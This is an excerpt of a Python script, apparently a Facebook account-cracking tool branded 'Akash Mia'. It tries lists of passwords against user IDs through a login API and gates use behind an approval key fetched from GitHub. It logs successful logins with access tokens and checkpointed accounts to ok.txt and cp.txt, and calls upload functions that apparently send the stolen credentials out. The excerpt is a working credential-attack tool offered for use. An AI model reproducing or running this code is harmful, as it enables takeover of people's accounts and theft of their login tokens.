...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/akashmia2052/CYBERAkash.py/blob/main/approval.txt"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/akashmia2052/CYBERAkash.py/blob/main/approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;90m══════════════════════════════════════════════════
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Akash Mia_OLD] : %s/%s -> \033[0;92m [ Akash Mia-OK:%s ]- \033[0;91m[R140N-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[Akash Mia-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [Akash Mia-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[Akash Mia-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Akash Mia-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
